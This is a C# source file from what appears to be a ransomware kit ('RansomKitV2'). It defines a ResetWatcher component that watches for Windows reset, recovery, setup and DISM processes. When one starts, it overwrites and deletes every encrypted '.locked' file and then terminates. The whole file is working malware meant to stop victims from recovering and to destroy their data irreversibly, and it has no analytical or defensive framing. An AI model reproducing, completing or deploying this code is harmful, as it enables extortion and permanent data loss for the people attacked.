using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Security.Cryptography;
using System.Threading;

namespace RansomKitV2
{
    // ══════════════════════════════════════════════════════════════
    //  ResetWatcher
    //
    //  Runs on a background daemon thread.
    //  If it detects any process that is part of Windows
    //  Reset / Recovery / Reinstall, it:
    //    1. Zero-overwrites then deletes every .locked file
    //    2. Forcefully exits the process
    //
    //  Strategy A — WMI __InstanceCreationEvent (preferred, low overhead)
    //  Strategy B — polling GetProcesses()     (fallback if WMI unavailable)
    // ══════════════════════════════════════════════════════════════

    static class ResetWatcher
    {
        // Process names that indicate a reset/recovery attempt
        static readonly HashSet<string> Triggers = new(StringComparer.OrdinalIgnoreCase)
        {
            // Windows Reset / Recovery
            "SystemReset.exe",
            "ResetEngine.exe",
            "srtasks.exe",           // System Restore / Recovery tasks
            "RecoveryDrive.exe",
            "WindowsREAgent.exe",
            "reagentc.exe",          // WinRE configuration tool

            // Installation / refresh
            "setup.exe",             // Windows Setup (upgrade / reinstall)
            "SetupHost.exe",
            "SetupPrep.exe",
            "MediaCreationTool.exe",

            // WinPE / DISM in recovery context
            "dism.exe",
            "Dism.exe",

            // Factory reset tooling
            "PushButtonReset.exe",
        };

        static List<string>            _lockedFiles = new();
        static ManagementEventWatcher? _wmiWatcher;

        // ── Public entry point ────────────────────────────────────

        /// <summary>
        /// Start watching in the background.
        /// <paramref name="lockedFiles"/> is the list of .locked paths to nuke if triggered.
        /// </summary>
        public static void Start(List<string> lockedFiles)
        {
            _lockedFiles = lockedFiles;

            var t = new Thread(WatchMain)
            {
                IsBackground = true,
                Priority     = ThreadPriority.AboveNormal,
                Name         = "ResetGuard"
            };
            t.Start();
        }

        // ── Thread entry ──────────────────────────────────────────

        static void WatchMain()
        {
            try
            {
                StartWmiSubscription();
                // WMI callback handles the rest; keep thread alive
                Thread.Sleep(Timeout.Infinite);
            }
            catch
            {
                // WMI unavailable — fall back to polling
                PollLoop();
            }
        }

        static void StartWmiSubscription()
        {
            // Fires within 1 second of any new process creation
            var query = new WqlEventQuery(
                "SELECT * FROM __InstanceCreationEvent WITHIN 1 " +
                "WHERE TargetInstance ISA 'Win32_Process'");

            _wmiWatcher = new ManagementEventWatcher(query);
            _wmiWatcher.EventArrived += OnProcessStarted;
            _wmiWatcher.Start();
        }

        static void OnProcessStarted(object sender, EventArrivedEventArgs e)
        {
            try
            {
                var proc = (ManagementBaseObject)e.NewEvent["TargetInstance"];
                string name = proc["Name"]?.ToString() ?? "";

                if (Triggers.Contains(name))
                    NukeAndExit("WMI detected reset process: " + name);
            }
            catch { }
        }

        // ── Polling fallback (runs if WMI subscription fails) ─────

        static void PollLoop()
        {
            while (true)
            {
                try
                {
                    foreach (var p in Process.GetProcesses())
                    {
                        try
                        {
                            // GetProcesses() returns name without .exe
                            string check = p.ProcessName + ".exe";
                            if (Triggers.Contains(check))
                            {
                                NukeAndExit("Polling detected reset process: " + check);
                                return;
                            }
                        }
                        catch { }
                        finally
                        {
                            try { p.Dispose(); } catch { }
                        }
                    }
                }
                catch { }

                Thread.Sleep(1_500);  // check every 1.5 seconds
            }
        }

        // ── Nuclear option ────────────────────────────────────────


        /// <summary>
        /// Securely overwrite then delete all .locked files.
        /// Called when the reset watcher detects tampering or on operator nuke trigger.
        /// </summary>
        public static void NukeLockedFiles(IEnumerable<string> lockedFiles)
        {
            foreach (var path in lockedFiles)
            {
                try
                {
                    if (!File.Exists(path)) continue;

                    var info = new FileInfo(path);
                    long size = info.Length;

                    if (size > 0)
                    {
                        // Three-pass overwrite: zeros, ones, random
                        using var fs = new FileStream(
                            path, FileMode.Open, FileAccess.Write,
                            FileShare.None, 4096, FileOptions.WriteThrough);

                        byte[] buf = new byte[Math.Min(size, 65536)];

                        // Pass 1 — zeros
                        Array.Clear(buf);
                        Overwrite(fs, buf, size);

                        // Pass 2 — ones
                        Array.Fill(buf, (byte)0xFF);
                        Overwrite(fs, buf, size);

                        // Pass 3 — random
                        RandomNumberGenerator.Fill(buf);
                        Overwrite(fs, buf, size);

                        fs.Flush(flushToDisk: true);
                    }

                    File.Delete(path);
                }
                catch
                {
                    // best-effort — skip locked/in-use files
                }
            }
        }

        static void Overwrite(FileStream fs, byte[] buf, long totalBytes)
        {
            fs.Seek(0, SeekOrigin.Begin);
            long written = 0;
            while (written < totalBytes)
            {
                int chunk = (int)Math.Min(buf.Length, totalBytes - written);
                fs.Write(buf, 0, chunk);
                written += chunk;
            }
        }

        static void NukeAndExit(string reason)
        {
            try { _wmiWatcher?.Stop(); } catch { }

            // call the local method, not CryptoEngine
            NukeLockedFiles(_lockedFiles);

            Environment.FailFast("Reset guard triggered: " + reason);
        }
    }
}
